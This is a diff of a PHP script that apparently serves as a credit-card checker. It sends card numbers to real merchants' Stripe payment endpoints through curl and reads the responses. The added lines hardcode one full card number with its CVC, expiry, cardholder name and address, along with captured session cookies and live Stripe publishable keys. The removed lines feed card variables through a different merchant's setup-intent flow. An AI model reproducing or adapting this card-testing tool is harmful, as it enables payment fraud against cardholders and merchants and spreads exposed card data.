@@ -152,27 +152,63 @@ $r = "0";
  
 $r = rand(0, 100);
   # -------------------- [1 REQ] -------------------#
-      $ch = curl_init();
-          curl_setopt($ch, CURLOPT_URL, 'https://stateaffairs.com/?wc-ajax=wc_stripe_frontend_request&elementor_page_id=8&path=/wc-stripe/v1/setup-intent');
-      curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-      curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-      curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-      curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method=stripe_cc');
-      $result1 = curl_exec($ch);
-      $client = Getstr($result1,'"client_secret":"','"');
-      $pi = Getstr($result1,'"client_secret":"','_secret');
+  $ch = curl_init();
+
+curl_setopt($ch, CURLOPT_URL, 'https://www.luggagetoship.com/order/ax_charge_order_pay');
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_POST, 1);
+curl_setopt($ch, CURLOPT_POSTFIELDS, "order_id=92095");
+curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
+
+$headers = array();
+$headers[] = 'Accept: */*';
+$headers[] = 'Accept-Language: es,es-ES;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6';
+$headers[] = 'Cache-Control: no-cache';
+$headers[] = 'Connection: keep-alive';
+$headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
+$headers[] = 'Cookie: comm100_visitorguid_21799=2e0ddd86-cfd3-4ba6-aaba-196dd44c0ecd; ci_session=3047e0a734155c061ea6e3278dff95abd7bf56c7; __stripe_sid=f30b716b-9429-4ac5-a60f-27d94d1fd539655607; __stripe_mid=fd289972-6223-4864-938b-bc44fcc4faf6140118';
+$headers[] = 'Origin: https://www.luggagetoship.com';
+$headers[] = 'Pragma: no-cache';
+$headers[] = 'Referer: https://www.luggagetoship.com/order/order_processing/92095';
+$headers[] = 'Sec-Fetch-Dest: empty';
+$headers[] = 'Sec-Fetch-Mode: cors';
+$headers[] = 'Sec-Fetch-Site: same-origin';
+$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0';
+$headers[] = 'X-Requested-With: XMLHttpRequest';
+$headers[] = 'Sec-Ch-Ua: ^^Not_A';
+$headers[] = 'Sec-Ch-Ua-Mobile: ?0';
+$headers[] = 'Sec-Ch-Ua-Platform: ^^Windows^^\"\"';
+curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+
+$result = curl_exec($ch);
 
 
 
+    $ch = curl_init();
 
-      $ch = curl_init();
-      curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/setup_intents/'.$pi.'/confirm');
-      curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-      curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-      curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-      curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method_data[type]=card&payment_method_data[billing_details][name]=Dark+Soul&payment_method_data[billing_details][address][city]=New+York+City&payment_method_data[billing_details][address][country]=US&payment_method_data[billing_details][address][line1]=Near+Cp&payment_method_data[billing_details][address][postal_code]=10001&payment_method_data[billing_details][address][state]=NY&payment_method_data[billing_details][email]=dsoul1'.$mail.'2%40gmail.com&payment_method_data[card][number]='.$cc.'&payment_method_data[card][cvc]='.$cvv.'&payment_method_data[card][exp_month]='.$mes.'&payment_method_data[card][exp_year]='.$ano.'&payment_method_data[payment_user_agent]=stripe.js%2F5b37d8a1b0%3B+stripe-js-v3%2F5b37d8a1b0&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_51HcXmvDqotq1S9R5e86L51GljOwHbcTdU7ajRRWIqiFXS650Soc0fxBCKN3oJkB6uMYwpVMtE3V5vDUMErFpspIU00PAsLtJuz&_stripe_account=acct_1HcXmvDqotq1S9R5&_stripe_version=2022-08-01&client_secret='.$client.'');
+curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_POST, 1);
+curl_setopt($ch, CURLOPT_POSTFIELDS, "time_on_page=697229&pasted_fields=number&guid=119a750e-9494-4efe-b137-e7a49987e99393b097&muid=fd289972-6223-4864-938b-bc44fcc4faf6140118&sid=f30b716b-9429-4ac5-a60f-27d94d1fd539655607&key=pk_live_vDBwegkvQzKsZsPgSnD40s6f&payment_user_agent=stripe.js^%^2F78ef418&card^[number^]=4381086424583789&card^[cvc^]=944&card^[exp_month^]=6&card^[exp_year^]=2027&card^[name^]=Halley+Swann&card^[address_line1^]=15+Driggs+Streets&card^[address_city^]=Driggs&card^[address_zip^]=84342&card^[address_state^]=&card^[address_country^]=AR");
+curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
+
+$headers = array();
+$headers[] = 'Authority: api.stripe.com';
+$headers[] = 'Accept: application/json';
+$headers[] = 'Accept-Language: en-US';
+$headers[] = 'Cache-Control: no-cache';
+$headers[] = 'Content-Type: application/x-www-form-urlencoded';
+$headers[] = 'Origin: https://js.stripe.com';
+$headers[] = 'Pragma: no-cache';
+$headers[] = 'Referer: https://js.stripe.com/';
+$headers[] = 'Sec-Ch-Ua: ^^Not_A';
+$headers[] = 'Sec-Ch-Ua-Mobile: ?0';
+$headers[] = 'Sec-Ch-Ua-Platform: ^^Windows^^\"\"';
+$headers[] = 'Sec-Fetch-Dest: empty';
+$headers[] = 'Sec-Fetch-Mode: cors';
+$headers[] = 'Sec-Fetch-Site: same-site';
+$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0';
+curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
       $result2 = curl_exec($ch);
       $msg2 = Getstr($result2,'"message": "','"');
 
